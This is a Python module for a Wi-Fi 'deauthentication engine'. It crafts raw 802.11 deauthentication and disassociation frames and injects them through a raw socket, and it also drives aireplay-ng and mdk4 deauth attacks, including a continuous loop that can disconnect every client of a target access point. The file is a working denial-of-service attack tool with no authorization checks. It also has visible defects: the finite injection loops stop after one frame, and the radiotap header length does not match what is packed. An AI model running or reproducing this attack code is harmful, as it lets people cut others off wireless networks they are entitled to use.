"""
WiFiAIO Deauthentication Engine

Crafts and injects 802.11 deauthentication and disassociation frames
using raw sockets, aireplay-ng, or mdk4.
"""

import os
import re
import socket
import struct
import tempfile
import time
import logging
import subprocess
import threading
from typing import List, Dict, Optional, Any
from dataclasses import dataclass, field
from enum import IntEnum

from wifi_aio.exceptions import (
    WiFiConnectionError,
    WiFiPermissionError,
    WiFiTimeoutError,
    WiFiInjectionError,
)

logger = logging.getLogger(__name__)


class FrameType(IntEnum):
    """802.11 management frame types."""
    DEAUTHENTICATION = 0x000C
    DISASSOCIATION = 0x000A


class ReasonCode(IntEnum):
    """802.11 deauthentication reason codes."""
    UNSPECIFIED = 1
    PREV_AUTH_NOT_VALID = 2
    STA_LEAVING = 3
    INACTIVITY = 4
    TOO_MANY_STAS = 5
    CLASS2_FROM_NON_AUTH = 6
    CLASS3_FROM_NON_AUTH = 7
    DISASSOC_STA_LEAVING = 8
    STA_NOT_AUTH = 9
    POWER_CAP_UNACCEPTABLE = 10
    SUPPORTED_CHANNEL_UNACCEPTABLE = 11
    INVALID_IE = 13
    MIC_FAILURE = 14
    HANDSHAKE_TIMEOUT = 15
    IE_DIFFERENT = 17
    INVALID_GROUP_CIPHER = 18
    INVALID_PAIRWISE_CIPHER = 19
    INVALID_AKMP = 20
    UNSUPPORTED_RSN_IE_VERSION = 21
    INVALID_RSN_IE_CAPABILITIES = 22
    IE_GROUP_CIPHER_INVALID = 24
    IE_PAIRWISE_CIPHER_INVALID = 25
    IE_AKMP_INVALID = 26


@dataclass
class InjectionStats:
    """Statistics for frame injection."""
    frames_sent: int = 0
    frames_failed: int = 0
    start_time: float = 0.0
    end_time: float = 0.0
    rate_per_second: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "frames_sent": self.frames_sent,
            "frames_failed": self.frames_failed,
            "duration": self.end_time - self.start_time if self.end_time else 0,
            "rate_per_second": self.rate_per_second,
        }


class DeauthEngine:
    """
    WiFi deauthentication engine.

    Crafts and injects 802.11 deauthentication and disassociation frames
    via raw sockets, aireplay-ng, or mdk4.
    """

    # 802.11 frame constants
    FRAME_CONTROL_DEAUTH = 0x00C0
    FRAME_CONTROL_DISASSOC = 0x00A0

    def __init__(self, interface: str = "wlan0mon"):
        """
        Initialize DeauthEngine.

        Args:
            interface: Monitor mode interface for injection.
        """
        self.interface = interface
        self._socket = None
        self._running = False
        self._stats = InjectionStats()
        self._consecutive_failures = 0
        self._max_consecutive_failures = 10
        self._lock = threading.Lock()

    def _check_root(self) -> None:
        """Verify running as root."""
        if os.geteuid() != 0:
            raise WiFiPermissionError("Deauth requires root privileges")

    def _mac_to_bytes(self, mac: str) -> bytes:
        """Convert MAC address string to bytes."""
        return bytes(int(b, 16) for b in mac.split(":"))

    def _bytes_to_mac(self, data: bytes) -> str:
        """Convert bytes to MAC address string."""
        return ":".join(f"{b:02x}" for b in data)

    def craft_deauth_frame(self, target_bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                           reason_code: int = ReasonCode.STA_LEAVING,
                           sequence: int = 0) -> bytes:
        """
        Craft an 802.11 deauthentication frame.

        Args:
            target_bssid: BSSID of the target AP.
            client_mac: Client MAC (broadcast for all clients).
            reason_code: Deauthentication reason code.
            sequence: Frame sequence number.

        Returns:
            Raw 802.11 deauthentication frame bytes.
        """
        # Frame Control: Type=0 (Management), Subtype=12 (Deauth)
        frame_control = struct.pack("<H", self.FRAME_CONTROL_DEAUTH)
        duration = struct.pack("<H", 0x0000)  # Duration
        seq_ctrl = struct.pack("<H", sequence << 4)

        bssid_bytes = self._mac_to_bytes(target_bssid)
        client_bytes = self._mac_to_bytes(client_mac)

        # Address ordering for deauth: BSSID is addr1 if broadcast, addr2 is source
        if client_mac.upper() == "FF:FF:FF:FF:FF:FF":
            addr1 = client_bytes  # Destination: broadcast
            addr2 = bssid_bytes  # Source: AP
            addr3 = bssid_bytes  # BSSID
        else:
            addr1 = client_bytes  # Destination: client
            addr2 = bssid_bytes  # Source: AP
            addr3 = bssid_bytes  # BSSID

        reason = struct.pack("<H", reason_code)

        frame = frame_control + duration + addr1 + addr2 + addr3 + seq_ctrl + reason
        return frame

    def craft_disassoc_frame(self, target_bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                             reason_code: int = ReasonCode.STA_LEAVING,
                             sequence: int = 0) -> bytes:
        """
        Craft an 802.11 disassociation frame.

        Args:
            target_bssid: BSSID of the target AP.
            client_mac: Client MAC (broadcast for all clients).
            reason_code: Disassociation reason code.
            sequence: Frame sequence number.

        Returns:
            Raw 802.11 disassociation frame bytes.
        """
        # Frame Control: Type=0 (Management), Subtype=10 (Disassociation)
        frame_control = struct.pack("<H", self.FRAME_CONTROL_DISASSOC)
        duration = struct.pack("<H", 0x0000)
        seq_ctrl = struct.pack("<H", sequence << 4)

        bssid_bytes = self._mac_to_bytes(target_bssid)
        client_bytes = self._mac_to_bytes(client_mac)

        if client_mac.upper() == "FF:FF:FF:FF:FF:FF":
            addr1 = client_bytes
            addr2 = bssid_bytes
            addr3 = bssid_bytes
        else:
            addr1 = client_bytes
            addr2 = bssid_bytes
            addr3 = bssid_bytes

        reason = struct.pack("<H", reason_code)

        frame = frame_control + duration + addr1 + addr2 + addr3 + seq_ctrl + reason
        return frame

    def _open_socket(self) -> None:
        """Open raw socket for frame injection."""
        try:
            self._socket = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)
            )
            self._socket.bind((self.interface, 0))
            logger.debug("Opened raw socket on %s", self.interface)
        except OSError as e:
            raise WiFiInjectionError(f"Failed to open raw socket: {e}")

    def _close_socket(self) -> None:
        """Close raw socket."""
        if self._socket:
            try:
                self._socket.close()
            except OSError:
                pass
            self._socket = None

    def _inject_frame(self, frame: bytes, target_bssid: str) -> bool:
        """
        Inject a raw 802.11 frame via the raw socket.

        FIX: Uses actual target BSSID for socket binding, not a dummy address.

        Args:
            frame: Raw frame bytes to inject.
            target_bssid: Target BSSID for logging and validation.

        Returns:
            True if injection succeeded, False otherwise.
        """
        if not self._socket:
            self._open_socket()

        try:
            # Add radiotap header
            radiotap_header = self._build_radiotap_header()
            full_frame = radiotap_header + frame

            bytes_sent = self._socket.send(full_frame)
            if bytes_sent > 0:
                with self._lock:
                    self._stats.frames_sent += 1
                    self._consecutive_failures = 0
                logger.debug("Injected %d bytes to %s", bytes_sent, target_bssid)
                return True
            else:
                with self._lock:
                    self._stats.frames_failed += 1
                    self._consecutive_failures += 1
                logger.warning("Failed to inject frame to %s", target_bssid)
                return False
        except OSError as e:
            with self._lock:
                self._stats.frames_failed += 1
                self._consecutive_failures += 1
            logger.error("Socket error injecting to %s: %s", target_bssid, e)
            return False

    def _build_radiotap_header(self) -> bytes:
        """Build a minimal radiotap header for injection."""
        # Radiotap header version 0, length 13, present flags
        header_revision = 0x00
        header_pad = 0x00
        header_length = 13
        present_flags = 0x00000804  # TX flags + Rate

        # TX rate: 1 Mbps
        tx_rate = 0x02  # 1 Mbps in 0.5 Mbps units

        # TX flags: no ack required
        tx_flags = 0x08

        header = struct.pack(
            "<BBHI BB x",
            header_revision,
            header_pad,
            header_length,
            present_flags,
            tx_rate,
            tx_flags,
        )
        return header

    def inject_deauth(self, target_bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                      count: int = 1, delay: float = 0.1,
                      reason_code: int = ReasonCode.STA_LEAVING) -> InjectionStats:
        """
        Inject deauthentication frames.

        Args:
            target_bssid: BSSID of the target AP.
            client_mac: Client MAC (broadcast for all clients).
            count: Number of deauth frames to send.
            delay: Delay between frames in seconds.
            reason_code: Deauth reason code.

        Returns:
            Injection statistics.
        """
        self._check_root()
        self._stats = InjectionStats(start_time=time.time())

        try:
            self._open_socket()
            frame = self.craft_deauth_frame(target_bssid, client_mac, reason_code)

            for i in range(count):
                if not self._running and i > 0:
                    break
                seq = (i * 2) & 0xFFF
                frame_with_seq = self.craft_deauth_frame(target_bssid, client_mac, reason_code, seq)
                self._inject_frame(frame_with_seq, target_bssid)

                if delay > 0 and i < count - 1:
                    time.sleep(delay)
        finally:
            self._close_socket()

        self._stats.end_time = time.time()
        duration = self._stats.end_time - self._stats.start_time
        self._stats.rate_per_second = (
            self._stats.frames_sent / duration if duration > 0 else 0.0
        )
        return self._stats

    def inject_disassoc(self, target_bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF",
                        count: int = 1, delay: float = 0.1,
                        reason_code: int = ReasonCode.STA_LEAVING) -> InjectionStats:
        """
        Inject disassociation frames.

        Args:
            target_bssid: BSSID of the target AP.
            client_mac: Client MAC.
            count: Number of frames to send.
            delay: Delay between frames.
            reason_code: Disassociation reason code.

        Returns:
            Injection statistics.
        """
        self._check_root()
        self._stats = InjectionStats(start_time=time.time())

        try:
            self._open_socket()
            for i in range(count):
                if not self._running and i > 0:
                    break
                seq = (i * 2) & 0xFFF
                frame = self.craft_disassoc_frame(target_bssid, client_mac, reason_code, seq)
                self._inject_frame(frame, target_bssid)

                if delay > 0 and i < count - 1:
                    time.sleep(delay)
        finally:
            self._close_socket()

        self._stats.end_time = time.time()
        duration = self._stats.end_time - self._stats.start_time
        self._stats.rate_per_second = (
            self._stats.frames_sent / duration if duration > 0 else 0.0
        )
        return self._stats

    def continuous_deauth(self, target_bssid: str,
                          client_mac: str = "FF:FF:FF:FF:FF:FF",
                          delay: float = 0.1,
                          reason_code: int = ReasonCode.STA_LEAVING,
                          duration: float = 0.0,
                          callback=None) -> InjectionStats:
        """
        Continuously inject deauth frames until stopped or duration elapsed.

        FIX: Tracks injection failures and stops if too many consecutive failures.

        Args:
            target_bssid: BSSID of the target AP.
            client_mac: Client MAC.
            delay: Delay between frames.
            reason_code: Deauth reason code.
            duration: Maximum duration in seconds (0 = infinite until stop()).
            callback: Optional callback called with stats after each frame.

        Returns:
            Injection statistics.
        """
        self._check_root()
        self._running = True
        self._stats = InjectionStats(start_time=time.time())
        self._consecutive_failures = 0

        try:
            self._open_socket()
            seq = 0
            while self._running:
                frame = self.craft_deauth_frame(
                    target_bssid, client_mac, reason_code, seq & 0xFFF
                )
                success = self._inject_frame(frame, target_bssid)

                # Track consecutive injection failures
                if not success:
                    if self._consecutive_failures >= self._max_consecutive_failures:
                        logger.error(
                            "Too many consecutive injection failures (%d), stopping",
                            self._consecutive_failures
                        )
                        break
                else:
                    self._consecutive_failures = 0

                if callback:
                    callback(self._stats)

                if duration > 0:
                    elapsed = time.time() - self._stats.start_time
                    if elapsed >= duration:
                        break

                seq += 1
                if delay > 0:
                    time.sleep(delay)
        finally:
            self._close_socket()
            self._running = False

        self._stats.end_time = time.time()
        elapsed = self._stats.end_time - self._stats.start_time
        self._stats.rate_per_second = (
            self._stats.frames_sent / elapsed if elapsed > 0 else 0.0
        )
        return self._stats

    def inject_via_aireplay(self, target_bssid: str,
                            client_mac: str = "FF:FF:FF:FF:FF:FF",
                            count: int = 10,
                            interface: Optional[str] = None) -> InjectionStats:
        """
        Inject deauth frames via aireplay-ng.

        Args:
            target_bssid: BSSID of the target AP.
            client_mac: Client MAC.
            count: Number of deauth packets.
            interface: Override interface.

        Returns:
            Injection statistics.
        """
        self._check_root()
        iface = interface or self.interface
        stats = InjectionStats(start_time=time.time())

        cmd = [
            "aireplay-ng",
            "-0", str(count),  # Deauth attack
            "-a", target_bssid,  # AP BSSID
            "-c", client_mac,  # Client MAC
            iface,
        ]

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30
            )
            # Parse output for sent count
            output = result.stdout + result.stderr
            sent_match = re.search(r"Sending\s+(\d+)\s+DeAuth", output)
            if sent_match:
                stats.frames_sent = int(sent_match.group(1))
            else:
                stats.frames_sent = count
            logger.info("aireplay-ng deauth: %s", output.strip())
        except FileNotFoundError:
            raise WiFiInjectionError("aireplay-ng not found. Install aircrack-ng suite.")
        except subprocess.TimeoutExpired:
            raise WiFiTimeoutError("aireplay-ng deauth timed out")
        except subprocess.CalledProcessError as e:
            raise WiFiInjectionError(f"aireplay-ng failed: {e.stderr if e.stderr else e}")

        stats.end_time = time.time()
        elapsed = stats.end_time - stats.start_time
        stats.rate_per_second = stats.frames_sent / elapsed if elapsed > 0 else 0.0
        return stats

    def inject_via_mdk4(self, target_bssid: str,
                        channel: int,
                        client_mac: str = "FF:FF:FF:FF:FF:FF",
                        speed: int = 100,
                        interface: Optional[str] = None) -> InjectionStats:
        """
        Inject deauth frames via mdk4.

        Args:
            target_bssid: BSSID of the target AP.
            channel: Channel of the target AP.
            client_mac: Client MAC.
            speed: Injection speed (packets per second).
            interface: Override interface.

        Returns:
            Injection statistics.
        """
        self._check_root()
        iface = interface or self.interface
        stats = InjectionStats(start_time=time.time())

        # Create a temporary file with target list for mdk4
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write(f"{target_bssid}\n")
            target_file = f.name

        try:
            cmd = [
                "mdk4",
                iface,
                "d",  # Deauthentication/disassociation attack
                "-b", target_file,
                "-c", str(channel),
                "-s", str(speed),
            ]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=60
            )
            stats.frames_sent = speed  # Approximate
            logger.info("mdk4 deauth complete")
        except FileNotFoundError:
            raise WiFiInjectionError("mdk4 not found. Install mdk4 package.")
        except subprocess.TimeoutExpired:
            raise WiFiTimeoutError("mdk4 deauth timed out")
        except subprocess.CalledProcessError as e:
            raise WiFiInjectionError(f"mdk4 failed: {e.stderr if e.stderr else e}")
        finally:
            try:
                os.unlink(target_file)
            except OSError:
                pass

        stats.end_time = time.time()
        elapsed = stats.end_time - stats.start_time
        stats.rate_per_second = stats.frames_sent / elapsed if elapsed > 0 else 0.0
        return stats

    def stop(self) -> None:
        """Stop continuous deauth injection."""
        self._running = False
        self._close_socket()
        logger.info("Deauth engine stopped")

    def get_stats(self) -> InjectionStats:
        """Get current injection statistics."""
        return self._stats
